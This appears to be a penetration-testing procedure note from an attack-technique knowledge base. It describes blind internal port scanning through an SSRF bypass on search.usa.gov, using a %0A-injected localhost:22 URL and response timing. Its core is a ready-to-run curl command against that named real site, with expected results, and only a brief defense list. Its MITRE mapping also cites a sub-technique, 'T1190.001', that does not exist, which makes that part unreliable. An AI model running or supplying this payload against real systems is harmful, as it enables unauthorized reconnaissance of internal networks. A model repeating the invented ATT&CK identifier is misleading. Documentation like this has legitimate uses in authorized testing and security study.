---
id: proc-ssrf-open-port
tags:
  - ssrf
  - port-scan
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Fiddler]]'
  - '[[tools/ZAP]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/ssrf-localhost-22-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Vulnerability Scanning]]'
updated_at: '2025-12-14T03:53:38.665Z'
sub_techniques:
  - '[[T1190.001]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Vulnerability Scanning]]'
---
# Test-SSRF-Bypass-on-Open-Port

## Summary

This procedure tests the SSRF bypass on an open localhost port (22) using %0A injection, leveraging connection timeouts to confirm port openness and the vulnerability's effectiveness for internal scanning.

## Description

Similar to closed port testing, but targeting 127.0.0.1:22 (open SSH) causes the server to hang during connection attempt, resulting in a long timeout. This differential timing enables blind port scanning of the internal network.

## Requirements

1. Authenticated session
2. Proxy for injection
3. Patience for timeout measurements

## Defense

Defensive measures and detection strategies:

- Block all internal IP requests at the application level
- Implement timeout limits on outbound fetches
- Alert on prolonged response times from the endpoint

## Objectives

1. Confirm open ports via timeout delays
2. Validate SSRF for active service detection
3. Map potential attack vectors

## Instructions

### Step 1: Craft Payload for Open Port

**Context**: Inject http://127.0.0.1:22/?%0A followed by legitimate URL.

Edit in proxy tool.

### Step 2: Execute and Time Request

**Context**: Send and measure response duration.

**Command** ([[commands/ssrf-localhost-22-test]]):
```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [your_session_cookies]" --max-time 15
```

> Expect ~10,468ms response with error for injected URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Vulnerability Scanning]] Scanning IP Blocks

### Sub-Techniques

- [[T1190.001]] Exploit Application Deployment Logic

## Commands Used

- [[commands/ssrf-localhost-22-test]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Fiddler]]
- [[tools/ZAP]]

## Tags

- ssrf
- port-scan
- bypass
